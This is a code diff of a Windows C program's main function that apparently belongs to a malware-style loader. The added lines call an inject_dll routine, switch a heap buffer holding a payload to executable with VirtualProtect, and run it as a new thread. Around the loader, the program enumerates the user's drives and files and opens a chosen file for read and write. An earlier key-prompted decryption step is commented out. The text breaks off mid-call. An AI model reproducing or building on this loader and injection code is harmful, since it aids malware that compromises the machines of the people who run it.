@@ -3,67 +3,56 @@
 
 
 
-int main(void) 
+int main(int argc, char *argv[])
 {
+	
+	inject_dll();
+
 	call();
 	
-	LPTEXT pText_t = Test();
+	LPTEXT pText_t = Test(argc, argv);
 	
 	if (pText_t == NULL) return -5;
 
-	unsigned char *pK[2049] = {'\0'};
+	/*
+	unsigned char *pK[256] = {'\0'};
 
-	//printf("[!] Enter Your Key Please:\n");
+	printf("[!] Enter Your Key Please:\n");
 	
-	fgets(pK, 2048, stdin);
+	fgets(pK, 255, stdin);
 
 	unsigned char *pDecryptedPayload = malloc(pText_t->sText);
 
-	Context context_t = { NULL };
-	
-	//for (int i = 0; i < )
-	
-	//SystemFunction033(pK, pText_t->pPayloadAddress, strlen(pK), pText->dwPayloadSize);
-
-	
-
-	rInit(&context_t, pK, strlen(pK));
-
-	rFin(&context_t, pText_t->pText, pDecryptedPayload, pText_t->sText);
-
-	
+	Context context_t;
 
 	//printf("[i] Payload in main: %s\n[i] Payload Heap Address: 0x%p\n[!] Decrypting Payload...\n",pText_t->pText, pText_t->pText);
+	*/	
 	
-	LPWSTR pPath[MAX_PATH] = { L'\0' };
+	DWORD dwOldRights;
+
+	if (!VirtualProtect(pText_t->pText, pText_t->sText, PAGE_EXECUTE_READ, &dwOldRights)) return -2;
+
+	DWORD dwThreadPid;
+
+	HANDLE hThread = CreateThread(NULL, 0, pText_t->pText, NULL, 0, &dwThreadPid);
+	
+	WCHAR pPath[MAX_PATH] = { L'\0' };
 
 	FetchDrives(pPath);
 	
-	if (pPath[0] == L'\0')
-	{
-		printf("[X] Failed To Fetch Drives!\n[X] Exiting With Error Code: %x\n", GetLastError());
-		return -1;
-	}
+	if (!pPath[0]) {printf("[X] Failed To Fetch Drives!\n[X] Exiting With Error Code: %x\n", GetLastError()); return -1;}
 	
 	PrintDrives(pPath);
 	
-	while (!UserInputDrives(pPath))
-	{
-		wprintf(
-			L"[X] Wrong Input!\n"
-		);
-		PrintDrives(
-			pPath
-		);
-	}
+	while (!UserInputDrives(pPath)) { printf("[X] Wrong Input!\n"); PrintDrives(pPath);}
 	
 	PrintCWD(pPath);
 	
-	LPWIN32_FIND_DATA_ARRAYW pFiles_arr_t = FetchFileArrayW(pPath);
+	WIN32_FIND_DATA_ARRAYW *pFiles_arr_t = FetchFileArrayW(pPath);
 	
 	if (pFiles_arr_t == NULL) 
 	{
-		printf("[X] Folder Choosing || Printing Failed!\n[X] Exiting With Error Code : % x\n", GetLastError());
+		printf("[X] Fetching Folders Failed\nError Code:0x%.8x\n", GetLastError());
 		return -2;
 	}
 	
@@ -87,18 +76,15 @@ int main(void)
 	wprintf(L"File Name: %s", pFiles_arr_t->pFiles_arr->file_data.cFileName);
 
 	if (pFiles_arr_t->pFiles_arr->file_data.dwFileAttributes & FILE_ATTRIBUTE_NORMAL)
-	{
-		printf("[X] You Choose  !\n[X] Exiting With Error Code : % x\n", GetLastError());
-		return -3;
-	}
+	{ printf("[X] Exiting With Error Code : % x\n", GetLastError()); return -3; }
 	
 	if(pFiles_arr_t != NULL)FreeFileArray(pFiles_arr_t);
 	HANDLE hFile = INVALID_HANDLE_VALUE;
-			/*
-		 * GENERIC_READ = 0x80000000
-		 * GENERIC_WRITE = 0x40000000. (0d1073741824).
-		 * GENERIC_READ | GENERIC_WRITE = 0xC0000000. (0d3221225472).
-		 */
+/*
+ * GENERIC_READ = 0x80000000
+ * GENERIC_WRITE = 0x40000000. (0d1073741824).
+ * GENERIC_READ | GENERIC_WRITE = 0xC0000000. (0d3221225472).
+ */
 	
 	hFile = CreateFileW(
 		pPath,
